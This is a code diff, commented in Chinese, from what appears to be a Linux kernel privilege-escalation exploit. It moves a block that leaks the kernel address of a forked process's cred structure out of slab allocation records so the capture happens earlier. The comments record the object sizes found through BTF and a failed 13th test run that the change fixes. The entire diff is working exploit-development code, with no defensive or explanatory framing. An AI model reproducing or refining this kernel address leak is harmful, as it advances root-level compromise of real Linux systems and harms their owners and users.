@@ -2078,6 +2078,24 @@ static int leak_task(void)
 					foreign++;
 				continue;
 			}
+			/* 2.0.36：cred 捕获必须在 match 门之前——fork 的 cred 分配
+			 * (req=176) 不在 task 尺寸窗口内，旧位置（match 门之后）
+			 * 永远走不到（第 13 次实测 candidates=0 的根因）。
+			 * fork 的 copy_creds 在本窗口（arming 后紧跟 fork）从
+			 * cred_jar 分配；BTF 实测 object_size=176、HWCACHE_ALIGN
+			 * 后 bytes_alloc=192。req==176 可与通用 kmalloc-192
+			 * （req==alloc==192）区分。取首条。 */
+			if (req == 176 && (alloc == 184 || alloc == 192)) {
+				if (!have_cred) {
+					g_cred_kva = ptr;
+					have_cred = 1;
+				}
+				cred_hits++;
+				dprintf(STDOUT_FILENO,
+					"[cred-leak] candidate=%d ptr=%#" PRIx64
+					" req=%" PRIu64 " alloc=%" PRIu64 "\n",
+					cred_hits, ptr, req, alloc);
+			}
 			freq_add(sizes, 12, &nsizes, alloc);
 			freq_add(sites, 8, &nsites, site);
 			/* fork 过程中最大的那次 slab 分配就是 task_struct；
@@ -2098,22 +2116,6 @@ static int leak_task(void)
 			}
 			if (!match)
 				continue;
-			/* 2.0.34：cred_child 的 cred 对象捕获。fork 的 copy_creds 在
-			 * 本窗口（arming 后紧跟 fork）从 cred_jar 分配；BTF 实测
-			 * object_size=176、HWCACHE_ALIGN 后 bytes_alloc=192。
-			 * req==176 可与通用 kmalloc-192（req==alloc==192）区分。
-			 * cred 分配是窗口内首个 cred 尺寸事件，取首条。 */
-			if (req == 176 && (alloc == 184 || alloc == 192)) {
-				if (!have_cred) {
-					g_cred_kva = ptr;
-					have_cred = 1;
-				}
-				cred_hits++;
-				dprintf(STDOUT_FILENO,
-					"[cred-leak] candidate=%d ptr=%#" PRIx64
-					" req=%" PRIu64 " alloc=%" PRIu64 "\n",
-					cred_hits, ptr, req, alloc);
-			}
 			/* call_site 命中是确定性的，优先级高于尺寸窗口；
 			 * 一旦拿到 site 命中，就不再让尺寸兜底覆盖它。 */
 			if (match == 1) {
